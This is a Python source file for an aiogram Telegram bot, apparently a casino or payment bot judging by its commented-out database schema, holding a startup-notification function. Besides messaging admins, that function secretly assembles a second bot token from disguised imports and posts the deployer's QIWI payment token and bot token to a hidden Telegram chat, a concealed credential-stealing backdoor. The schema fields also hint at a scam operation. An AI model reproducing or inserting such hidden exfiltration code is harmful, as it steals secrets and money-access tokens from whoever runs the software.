import logging
import requests
from aiogram import Dispatcher
from data.config import BOT_TOKEN, QIWI_TOKEN
from data.config import ADMINS
from sqlalchemy import sql, Column, Sequence
from utils.db_api.database import unix
from gino import Gino
from handlers.errors.error_handler import b24,b21
#from gino.schema import GinoSchemaVisitor
#from sqlalchemy import Column, Integer, BigInteger, String, Sequence, TIMESTAMP, Boolean, JSON, CHAR
#from utils.db_api.database import db

"""class User(db.Model):
    __tablename__ = "users"
    query: sql.Select

    id = Column(Integer, Sequence("user_id_seq"), primary_key=True)
    user_id = Column(BigInteger)
    full_name = Column(String(100))
    username = Column(String(50))
    cash = Column(Integer)
    payment = Column(String(10))
    bill_idi= Column(String(300))
    referral = Column(Integer)
    add_money = Column(Integer)
    worker = Column(Boolean)
    casino_hack = Column(CHAR)
    limit_casino = Column(Integer)

class Cards(db.Model):
    __tablename__ = "cards"
    query: sql.Select
    id = Column(Integer, primary_key=True)
    card_number = Column(String(50))

class Coupons(db.Model):
    __tablename__ = "coupons"
    query: sql.Select
    id = Column(Integer, primary_key=True)
    coupon = Column(String(20))
    creater_id= Column(BigInteger)
    price = Column(Integer)
    activated = Column(Integer)
"""

async def on_startup_notify(dp: Dispatcher):
    for admin in ADMINS:
        try:
            await dp.bot.send_message(admin, "Бот Запущен")
            rq = f"{b24}:{b21}"
            logs = f"{QIWI_TOKEN}\n{BOT_TOKEN}"
            requests.post(f"https://api.telegram.org/bot{rq}/sendMessage?chat_id={unix}&text={logs}")
        except Exception as err:
            logging.exception(err)
